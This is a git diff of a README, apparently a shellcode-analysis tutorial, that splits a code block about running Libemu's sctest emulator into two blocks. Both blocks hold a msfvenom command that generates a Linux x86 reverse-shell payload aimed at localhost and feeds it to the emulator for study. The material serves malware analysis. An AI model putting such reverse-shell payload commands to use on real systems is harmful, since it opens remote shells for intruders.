@@ -30,13 +30,15 @@ If the port causes problems, a warning message will appear:
 ## First approach: Libemu
 
 
-After installing Libemu, we will use the sctest binary. We can get the result using the binary directly or the libemu.sh script (in scripts/ folder):
-
+After installing Libemu, we will use the sctest binary. We can get the result using the binary directly:
 
 ```
 msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f raw LPORT=8888 LHOST=127.0.0.1 | ./sctest -vvv -Ss 10000 -G reverseshell.dot
--------------------------------------
+```
 
+Or we can use the libemu.sh script (in scripts/ folder):
+
+```
 sh libemu.sh "msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f raw LPORT=8888 LHOST=127.0.0.1" reverseshell | tee libemu_res/libemu_res.txt
 ```
 
